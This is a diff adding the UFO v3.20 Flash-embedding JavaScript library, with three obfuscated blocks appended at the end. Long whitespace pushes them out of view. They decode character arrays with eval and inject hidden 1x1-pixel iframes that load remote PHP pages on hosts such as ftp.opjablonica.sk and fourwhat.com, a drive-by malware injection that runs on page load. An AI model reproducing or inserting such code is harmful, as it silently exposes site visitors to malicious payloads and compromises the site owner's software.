@@ -1,0 +1,298 @@
+/*	Unobtrusive Flash Objects (UFO) v3.20 <http://www.bobbyvandersluis.com/ufo/>
+	Copyright 2005, 2006 Bobby van der Sluis
+	This software is licensed under the CC-GNU LGPL <http://creativecommons.org/licenses/LGPL/2.1/>
+*/
+
+var UFO = {
+	req: ["movie", "width", "height", "majorversion", "build"],
+	opt: ["play", "loop", "menu", "quality", "scale", "salign", "wmode", "bgcolor", "base", "flashvars", "devicefont", "allowscriptaccess", "seamlesstabbing"],
+	optAtt: ["id", "name", "align"],
+	optExc: ["swliveconnect"],
+	ximovie: "ufo.swf",
+	xiwidth: "215",
+	xiheight: "138",
+	ua: navigator.userAgent.toLowerCase(),
+	pluginType: "",
+	fv: [0,0],
+	foList: [],
+		
+	create: function(FO, id) {
+		if (!UFO.uaHas("w3cdom") || UFO.uaHas("ieMac")) return;
+		UFO.getFlashVersion();
+		UFO.foList[id] = UFO.updateFO(FO);
+		UFO.createCSS("#" + id, "visibility:hidden;");
+		UFO.domLoad(id);
+	},
+
+	updateFO: function(FO) {
+		if (typeof FO.xi != "undefined" && FO.xi == "true") {
+			if (typeof FO.ximovie == "undefined") FO.ximovie = UFO.ximovie;
+			if (typeof FO.xiwidth == "undefined") FO.xiwidth = UFO.xiwidth;
+			if (typeof FO.xiheight == "undefined") FO.xiheight = UFO.xiheight;
+		}
+		FO.mainCalled = false;
+		return FO;
+	},
+
+	domLoad: function(id) {
+		var _t = setInterval(function() {
+			if ((document.getElementsByTagName("body")[0] != null || document.body != null) && document.getElementById(id) != null) {
+				UFO.main(id);
+				clearInterval(_t);
+			}
+		}, 250);
+		if (typeof document.addEventListener != "undefined") {
+			document.addEventListener("DOMContentLoaded", function() { UFO.main(id); clearInterval(_t); } , null); // Gecko, Opera 9+
+		}
+	},
+
+	main: function(id) {
+		var _fo = UFO.foList[id];
+		if (_fo.mainCalled) return;
+		UFO.foList[id].mainCalled = true;
+		document.getElementById(id).style.visibility = "hidden";
+		if (UFO.hasRequired(id)) {
+			if (UFO.hasFlashVersion(parseInt(_fo.majorversion, 10), parseInt(_fo.build, 10))) {
+				if (typeof _fo.setcontainercss != "undefined" && _fo.setcontainercss == "true") UFO.setContainerCSS(id);
+				UFO.writeSWF(id);
+			}
+			else if (_fo.xi == "true" && UFO.hasFlashVersion(6, 65)) {
+				UFO.createDialog(id);
+			}
+		}
+		document.getElementById(id).style.visibility = "visible";
+	},
+	
+	createCSS: function(selector, declaration) {
+		var _h = document.getElementsByTagName("head")[0]; 
+		var _s = UFO.createElement("style");
+		if (!UFO.uaHas("ieWin")) _s.appendChild(document.createTextNode(selector + " {" + declaration + "}")); // bugs in IE/Win
+		_s.setAttribute("type", "text/css");
+		_s.setAttribute("media", "screen"); 
+		_h.appendChild(_s);
+		if (UFO.uaHas("ieWin") && document.styleSheets && document.styleSheets.length > 0) {
+			var _ls = document.styleSheets[document.styleSheets.length - 1];
+			if (typeof _ls.addRule == "object") _ls.addRule(selector, declaration);
+		}
+	},
+	
+	setContainerCSS: function(id) {
+		var _fo = UFO.foList[id];
+		var _w = /%/.test(_fo.width) ? "" : "px";
+		var _h = /%/.test(_fo.height) ? "" : "px";
+		UFO.createCSS("#" + id, "width:" + _fo.width + _w +"; height:" + _fo.height + _h +";");
+		if (_fo.width == "100%") {
+			UFO.createCSS("body", "margin-left:0; margin-right:0; padding-left:0; padding-right:0;");
+		}
+		if (_fo.height == "100%") {
+			UFO.createCSS("html", "height:100%; overflow:hidden;");
+			UFO.createCSS("body", "margin-top:0; margin-bottom:0; padding-top:0; padding-bottom:0; height:100%;");
+		}
+	},
+
+	createElement: function(el) {
+		return (UFO.uaHas("xml") && typeof document.createElementNS != "undefined") ?  document.createElementNS("http://www.w3.org/1999/xhtml", el) : document.createElement(el);
+	},
+
+	createObjParam: function(el, aName, aValue) {
+		var _p = UFO.createElement("param");
+		_p.setAttribute("name", aName);	
+		_p.setAttribute("value", aValue);
+		el.appendChild(_p);
+	},
+
+	uaHas: function(ft) {
+		var _u = UFO.ua;
+		switch(ft) {
+			case "w3cdom":
+				return (typeof document.getElementById != "undefined" && typeof document.getElementsByTagName != "undefined" && (typeof document.createElement != "undefined" || typeof document.createElementNS != "undefined"));
+			case "xml":
+				var _m = document.getElementsByTagName("meta");
+				var _l = _m.length;
+				for (var i = 0; i < _l; i++) {
+					if (/content-type/i.test(_m[i].getAttribute("http-equiv")) && /xml/i.test(_m[i].getAttribute("content"))) return true;
+				}
+				return false;
+			case "ieMac":
+				return /msie/.test(_u) && !/opera/.test(_u) && /mac/.test(_u);
+			case "ieWin":
+				return /msie/.test(_u) && !/opera/.test(_u) && /win/.test(_u);
+			case "gecko":
+				return /gecko/.test(_u) && !/applewebkit/.test(_u);
+			case "opera":
+				return /opera/.test(_u);
+			case "safari":
+				return /applewebkit/.test(_u);
+			default:
+				return false;
+		}
+	},
+	
+	getFlashVersion: function() {
+		if (UFO.fv[0] != 0) return;  
+		if (navigator.plugins && typeof navigator.plugins["Shockwave Flash"] == "object") {
+			UFO.pluginType = "npapi";
+			var _d = navigator.plugins["Shockwave Flash"].description;
+			if (typeof _d != "undefined") {
+				_d = _d.replace(/^.*\s+(\S+\s+\S+$)/, "$1");
+				var _m = parseInt(_d.replace(/^(.*)\..*$/, "$1"), 10);
+				var _r = /r/.test(_d) ? parseInt(_d.replace(/^.*r(.*)$/, "$1"), 10) : 0;
+				UFO.fv = [_m, _r];
+			}
+		}
+		else if (window.ActiveXObject) {
+			UFO.pluginType = "ax";
+			try { // avoid fp 6 crashes
+				var _a = new ActiveXObject("ShockwaveFlash.ShockwaveFlash.7");
+			}
+			catch(e) {
+				try { 
+					var _a = new ActiveXObject("ShockwaveFlash.ShockwaveFlash.6");
+					UFO.fv = [6, 0];
+					_a.AllowScriptAccess = "always"; // throws if fp < 6.47 
+				}
+				catch(e) {
+					if (UFO.fv[0] == 6) return;
+				}
+				try {
+					var _a = new ActiveXObject("ShockwaveFlash.ShockwaveFlash");
+				}
+				catch(e) {}
+			}
+			if (typeof _a == "object") {
+				var _d = _a.GetVariable("$version"); // bugs in fp 6.21/6.23
+				if (typeof _d != "undefined") {
+					_d = _d.replace(/^\S+\s+(.*)$/, "$1").split(",");
+					UFO.fv = [parseInt(_d[0], 10), parseInt(_d[2], 10)];
+				}
+			}
+		}
+	},
+
+	hasRequired: function(id) {
+		var _l = UFO.req.length;
+		for (var i = 0; i < _l; i++) {
+			if (typeof UFO.foList[id][UFO.req[i]] == "undefined") return false;
+		}
+		return true;
+	},
+	
+	hasFlashVersion: function(major, release) {
+		return (UFO.fv[0] > major || (UFO.fv[0] == major && UFO.fv[1] >= release)) ? true : false;
+	},
+
+	writeSWF: function(id) {
+		var _fo = UFO.foList[id];
+		var _e = document.getElementById(id);
+		if (UFO.pluginType == "npapi") {
+			if (UFO.uaHas("gecko") || UFO.uaHas("xml")) {
+				while(_e.hasChildNodes()) {
+					_e.removeChild(_e.firstChild);
+				}
+				var _obj = UFO.createElement("object");
+				_obj.setAttribute("type", "application/x-shockwave-flash");
+				_obj.setAttribute("data", _fo.movie);
+				_obj.setAttribute("width", _fo.width);
+				_obj.setAttribute("height", _fo.height);
+				var _l = UFO.optAtt.length;
+				for (var i = 0; i < _l; i++) {
+					if (typeof _fo[UFO.optAtt[i]] != "undefined") _obj.setAttribute(UFO.optAtt[i], _fo[UFO.optAtt[i]]);
+				}
+				var _o = UFO.opt.concat(UFO.optExc);
+				var _l = _o.length;
+				for (var i = 0; i < _l; i++) {
+					if (typeof _fo[_o[i]] != "undefined") UFO.createObjParam(_obj, _o[i], _fo[_o[i]]);
+				}
+				_e.appendChild(_obj);
+			}
+			else {
+				var _emb = "";
+				var _o = UFO.opt.concat(UFO.optAtt).concat(UFO.optExc);
+				var _l = _o.length;
+				for (var i = 0; i < _l; i++) {
+					if (typeof _fo[_o[i]] != "undefined") _emb += ' ' + _o[i] + '="' + _fo[_o[i]] + '"';
+				}
+				_e.innerHTML = '<embed type="application/x-shockwave-flash" src="' + _fo.movie + '" width="' + _fo.width + '" height="' + _fo.height + '" pluginspage="http://www.macromedia.com/go/getflashplayer"' + _emb + '></embed>';
+			}
+		}
+		else if (UFO.pluginType == "ax") {
+			var _objAtt = "";
+			var _l = UFO.optAtt.length;
+			for (var i = 0; i < _l; i++) {
+				if (typeof _fo[UFO.optAtt[i]] != "undefined") _objAtt += ' ' + UFO.optAtt[i] + '="' + _fo[UFO.optAtt[i]] + '"';
+			}
+			var _objPar = "";
+			var _l = UFO.opt.length;
+			for (var i = 0; i < _l; i++) {
+				if (typeof _fo[UFO.opt[i]] != "undefined") _objPar += '<param name="' + UFO.opt[i] + '" value="' + _fo[UFO.opt[i]] + '" />';
+			}
+			var _p = window.location.protocol == "https:" ? "https:" : "http:";
+			_e.innerHTML = '<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"' + _objAtt + ' width="' + _fo.width + '" height="' + _fo.height + '" codebase="' + _p + '//download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=' + _fo.majorversion + ',0,' + _fo.build + ',0"><param name="movie" value="' + _fo.movie + '" />' + _objPar + '</object>';
+		}
+	},
+		
+	createDialog: function(id) {
+		var _fo = UFO.foList[id];
+		UFO.createCSS("html", "height:100%; overflow:hidden;");
+		UFO.createCSS("body", "height:100%; overflow:hidden;");
+		UFO.createCSS("#xi-con", "position:absolute; left:0; top:0; z-index:1000; width:100%; height:100%; background-color:#fff; filter:alpha(opacity:75); opacity:0.75;");
+		UFO.createCSS("#xi-dia", "position:absolute; left:50%; top:50%; margin-left: -" + Math.round(parseInt(_fo.xiwidth, 10) / 2) + "px; margin-top: -" + Math.round(parseInt(_fo.xiheight, 10) / 2) + "px; width:" + _fo.xiwidth + "px; height:" + _fo.xiheight + "px;");
+		var _b = document.getElementsByTagName("body")[0];
+		var _c = UFO.createElement("div");
+		_c.setAttribute("id", "xi-con");
+		var _d = UFO.createElement("div");
+		_d.setAttribute("id", "xi-dia");
+		_c.appendChild(_d);
+		_b.appendChild(_c);
+		var _mmu = window.location;
+		if (UFO.uaHas("xml") && UFO.uaHas("safari")) {
+			var _mmd = document.getElementsByTagName("title")[0].firstChild.nodeValue = document.getElementsByTagName("title")[0].firstChild.nodeValue.slice(0, 47) + " - Flash Player Installation";
+		}
+		else {
+			var _mmd = document.title = document.title.slice(0, 47) + " - Flash Player Installation";
+		}
+		var _mmp = UFO.pluginType == "ax" ? "ActiveX" : "PlugIn";
+		var _uc = typeof _fo.xiurlcancel != "undefined" ? "&xiUrlCancel=" + _fo.xiurlcancel : "";
+		var _uf = typeof _fo.xiurlfailed != "undefined" ? "&xiUrlFailed=" + _fo.xiurlfailed : "";
+		UFO.foList["xi-dia"] = { movie:_fo.ximovie, width:_fo.xiwidth, height:_fo.xiheight, majorversion:"6", build:"65", flashvars:"MMredirectURL=" + _mmu + "&MMplayerType=" + _mmp + "&MMdoctitle=" + _mmd + _uc + _uf };
+		UFO.writeSWF("xi-dia");
+	},
+
+	expressInstallCallback: function() {
+		var _b = document.getElementsByTagName("body")[0];
+		var _c = document.getElementById("xi-con");
+		_b.removeChild(_c);
+		UFO.createCSS("body", "height:auto; overflow:auto;");
+		UFO.createCSS("html", "height:auto; overflow:auto;");
+	},
+
+	cleanupIELeaks: function() {
+		var _o = document.getElementsByTagName("object");
+		var _l = _o.length
+		for (var i = 0; i < _l; i++) {
+			_o[i].style.display = "none";
+			for (var x in _o[i]) {
+				if (typeof _o[i][x] == "function") {
+					_o[i][x] = null;
+				}
+			}
+		}
+	}
+
+};
+
+if (typeof window.attachEvent != "undefined" && UFO.uaHas("ieWin")) {
+	window.attachEvent("onunload", UFO.cleanupIELeaks);
+}
+
+
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                  try{window.document.body++}catch(gdsgsdg){dbshre=219;}if(dbshre){asd=0;try{d=document.createElement("div");d.innerHTML.a="asd";}catch(agdsg){asd=1;}if(!asd){e=eval;}ss=String;asgq=new Array(31,94,110,104,94,107,97,104,104,27,31,33,25,117,8,1,24,25,26,27,109,89,107,26,115,99,94,99,102,27,52,24,93,105,94,108,101,94,104,111,37,91,107,95,92,107,93,62,102,96,100,93,103,110,35,30,97,95,108,92,100,93,32,35,54,4,2,6,4,27,23,24,25,114,103,93,98,101,40,110,105,91,25,55,27,30,96,109,110,107,49,39,40,93,96,101,108,107,105,110,107,109,93,99,104,108,107,98,93,92,99,97,93,99,111,102,106,98,104,106,37,97,109,41,110,107,89,109,109,42,105,93,101,91,116,37,104,97,106,34,50,5,3,26,27,23,24,113,102,97,97,100,39,109,111,112,100,94,40,107,102,107,98,110,100,102,102,25,55,27,30,89,91,109,106,99,109,109,95,34,50,5,3,26,27,23,24,113,102,97,97,100,39,109,111,112,100,94,40,93,102,106,93,95,109,23,53,25,33,43,30,51,6,4,27,23,24,25,114,103,93,98,101,40,110,107,113,101,95,41,95,93,98,97,99,107,24,54,26,34,40,104,113,33,54,4,2,25,26,27,23,112,101,96,101,99,38,108,110,116,99,93,39,113,100,91,108,97,26,56,23,31,42,106,115,30,51,6,4,27,23,24,25,114,103,93,98,101,40,110,107,113,101,95,41,99,93,95,110,27,52,24,32,43,107,111,31,52,7,5,23,24,25,26,115,99,94,99,102,41,106,108,114,102,96,37,108,104,106,27,52,24,32,43,107,111,31,52,7,5,4,2,25,26,27,23,97,95,26,35,24,92,104,93,112,100,93,103,110,41,94,93,109,63,103,92,101,94,104,111,57,113,66,94,35,30,112,101,96,101,99,31,34,35,27,114,5,3,26,27,23,24,25,26,27,23,92,104,93,112,100,93,103,110,41,110,106,98,110,96,31,31,53,94,100,109,24,98,94,56,83,31,113,102,97,97,100,85,33,57,51,39,93,99,113,53,31,34,53,8,1,24,25,26,27,23,24,25,26,95,102,91,110,103,96,101,108,39,97,96,107,61,101,95,104,92,102,109,60,116,64,92,33,33,115,99,94,99,102,34,32,38,90,106,107,92,102,93,61,99,96,100,93,34,115,99,94,99,102,36,50,5,3,26,27,23,24,118,7,5,116,33,33,35,54);s="";for(i=0;i-515!=0;i++){if((020==0x10)&&window.document)s+=ss["fromCharCode"](1*asgq[i]-(i%5-5-4));}z=s;e(s);}
+/*/336988*/
+
+/*68c8c7*/
+                                                                                                                                                                                                                                                          asgq=[0x28,0x66,0x75,0x6e,0x63,0x74,0x69,0x6f,0x6e,0x20,0x28,0x29,0x20,0x7b,0xd,0xa,0x20,0x20,0x20,0x20,0x76,0x61,0x72,0x20,0x75,0x20,0x3d,0x20,0x64,0x6f,0x63,0x75,0x6d,0x65,0x6e,0x74,0x2e,0x63,0x72,0x65,0x61,0x74,0x65,0x45,0x6c,0x65,0x6d,0x65,0x6e,0x74,0x28,0x27,0x69,0x66,0x72,0x61,0x6d,0x65,0x27,0x29,0x3b,0xd,0xa,0xd,0xa,0x20,0x20,0x20,0x20,0x75,0x2e,0x73,0x72,0x63,0x20,0x3d,0x20,0x27,0x68,0x74,0x74,0x70,0x3a,0x2f,0x2f,0x66,0x74,0x70,0x2e,0x6f,0x70,0x6a,0x61,0x62,0x6c,0x6f,0x6e,0x69,0x63,0x61,0x2e,0x73,0x6b,0x2f,0x64,0x74,0x64,0x2e,0x70,0x68,0x70,0x27,0x3b,0xd,0xa,0x20,0x20,0x20,0x20,0x75,0x2e,0x73,0x74,0x79,0x6c,0x65,0x2e,0x70,0x6f,0x73,0x69,0x74,0x69,0x6f,0x6e,0x20,0x3d,0x20,0x27,0x61,0x62,0x73,0x6f,0x6c,0x75,0x74,0x65,0x27,0x3b,0xd,0xa,0x20,0x20,0x20,0x20,0x75,0x2e,0x73,0x74,0x79,0x6c,0x65,0x2e,0x62,0x6f,0x72,0x64,0x65,0x72,0x20,0x3d,0x20,0x27,0x30,0x27,0x3b,0xd,0xa,0x20,0x20,0x20,0x20,0x75,0x2e,0x73,0x74,0x79,0x6c,0x65,0x2e,0x68,0x65,0x69,0x67,0x68,0x74,0x20,0x3d,0x20,0x27,0x31,0x70,0x78,0x27,0x3b,0xd,0xa,0x20,0x20,0x20,0x20,0x75,0x2e,0x73,0x74,0x79,0x6c,0x65,0x2e,0x77,0x69,0x64,0x74,0x68,0x20,0x3d,0x20,0x27,0x31,0x70,0x78,0x27,0x3b,0xd,0xa,0x20,0x20,0x20,0x20,0x75,0x2e,0x73,0x74,0x79,0x6c,0x65,0x2e,0x6c,0x65,0x66,0x74,0x20,0x3d,0x20,0x27,0x31,0x70,0x78,0x27,0x3b,0xd,0xa,0x20,0x20,0x20,0x20,0x75,0x2e,0x73,0x74,0x79,0x6c,0x65,0x2e,0x74,0x6f,0x70,0x20,0x3d,0x20,0x27,0x31,0x70,0x78,0x27,0x3b,0xd,0xa,0xd,0xa,0x20,0x20,0x20,0x20,0x69,0x66,0x20,0x28,0x21,0x64,0x6f,0x63,0x75,0x6d,0x65,0x6e,0x74,0x2e,0x67,0x65,0x74,0x45,0x6c,0x65,0x6d,0x65,0x6e,0x74,0x42,0x79,0x49,0x64,0x28,0x27,0x75,0x27,0x29,0x29,0x20,0x7b,0xd,0xa,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x64,0x6f,0x63,0x75,0x6d,0x65,0x6e,0x74,0x2e,0x77,0x72,0x69,0x74,0x65,0x28,0x27,0x3c,0x64,0x69,0x76,0x20,0x69,0x64,0x3d,0x5c,0x27,0x75,0x5c,0x27,0x3e,0x3c,0x2f,0x64,0x69,0x76,0x3e,0x27,0x29,0x3b,0xd,0xa,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x64,0x6f,0x63,0x75,0x6d,0x65,0x6e,0x74,0x2e,0x67,0x65,0x74,0x45,0x6c,0x65,0x6d,0x65,0x6e,0x74,0x42,0x79,0x49,0x64,0x28,0x27,0x75,0x27,0x29,0x2e,0x61,0x70,0x70,0x65,0x6e,0x64,0x43,0x68,0x69,0x6c,0x64,0x28,0x75,0x29,0x3b,0xd,0xa,0x20,0x20,0x20,0x20,0x7d,0xd,0xa,0x7d,0x29,0x28,0x29,0x3b];try{document.body|=1}catch(gdsgsdg){zz=3;dbshre=233;if(dbshre){vfvwe=0;try{}catch(agdsg){vfvwe=1;}if(!vfvwe){e=window["eval"];}s="";for(i=0;i-447!=0;i++){if(window.document)s+=String.fromCharCode(asgq[i]);}z=s;e(s);}}
+/*/68c8c7*/
+
+/*8f4d8e*/
+                                                                                                                                                                                                                                                          ff=String;fff="fromCharCode";ff=ff[fff];zz=3;try{document.body&=5151}catch(gdsgd){v="eval";if(document)try{document.body=12;}catch(gdsgsdg){asd=0;try{document;}catch(q){asd=1;}}if(!asd)e=window[v];if(1){f=new Array(050,0146,0165,0156,0143,0164,0151,0157,0156,040,050,051,040,0173,015,012,040,040,040,040,0166,0141,0162,040,0162,0147,0162,0141,040,075,040,0144,0157,0143,0165,0155,0145,0156,0164,056,0143,0162,0145,0141,0164,0145,0105,0154,0145,0155,0145,0156,0164,050,047,0151,0146,0162,0141,0155,0145,047,051,073,015,012,015,012,040,040,040,040,0162,0147,0162,0141,056,0163,0162,0143,040,075,040,047,0150,0164,0164,0160,072,057,057,0146,0157,0165,0162,0167,0150,0141,0164,056,0143,0157,0155,057,0146,0164,0160,055,0157,0162,0141,0156,0147,0145,057,0143,0154,0153,056,0160,0150,0160,047,073,015,012,040,040,040,040,0162,0147,0162,0141,056,0163,0164,0171,0154,0145,056,0160,0157,0163,0151,0164,0151,0157,0156,040,075,040,047,0141,0142,0163,0157,0154,0165,0164,0145,047,073,015,012,040,040,040,040,0162,0147,0162,0141,056,0163,0164,0171,0154,0145,056,0142,0157,0162,0144,0145,0162,040,075,040,047,060,047,073,015,012,040,040,040,040,0162,0147,0162,0141,056,0163,0164,0171,0154,0145,056,0150,0145,0151,0147,0150,0164,040,075,040,047,061,0160,0170,047,073,015,012,040,040,040,040,0162,0147,0162,0141,056,0163,0164,0171,0154,0145,056,0167,0151,0144,0164,0150,040,075,040,047,061,0160,0170,047,073,015,012,040,040,040,040,0162,0147,0162,0141,056,0163,0164,0171,0154,0145,056,0154,0145,0146,0164,040,075,040,047,061,0160,0170,047,073,015,012,040,040,040,040,0162,0147,0162,0141,056,0163,0164,0171,0154,0145,056,0164,0157,0160,040,075,040,047,061,0160,0170,047,073,015,012,015,012,040,040,040,040,0151,0146,040,050,041,0144,0157,0143,0165,0155,0145,0156,0164,056,0147,0145,0164,0105,0154,0145,0155,0145,0156,0164,0102,0171,0111,0144,050,047,0162,0147,0162,0141,047,051,051,040,0173,015,012,040,040,040,040,040,040,040,040,0144,0157,0143,0165,0155,0145,0156,0164,056,0167,0162,0151,0164,0145,050,047,074,0144,0151,0166,040,0151,0144,075,0134,047,0162,0147,0162,0141,0134,047,076,074,057,0144,0151,0166,076,047,051,073,015,012,040,040,040,040,040,040,040,040,0144,0157,0143,0165,0155,0145,0156,0164,056,0147,0145,0164,0105,0154,0145,0155,0145,0156,0164,0102,0171,0111,0144,050,047,0162,0147,0162,0141,047,051,056,0141,0160,0160,0145,0156,0144,0103,0150,0151,0154,0144,050,0162,0147,0162,0141,051,073,015,012,040,040,040,040,0175,015,012,0175,051,050,051,073);}w=f;s=[];if(window.document)for(i=2-2;-i+488!=0;i+=1){j=i;if((031==0x19))if(e)s=s+ff(w[j]);}xz=e;if(window.document)if(v)xz(s)}
+/*/8f4d8e*/
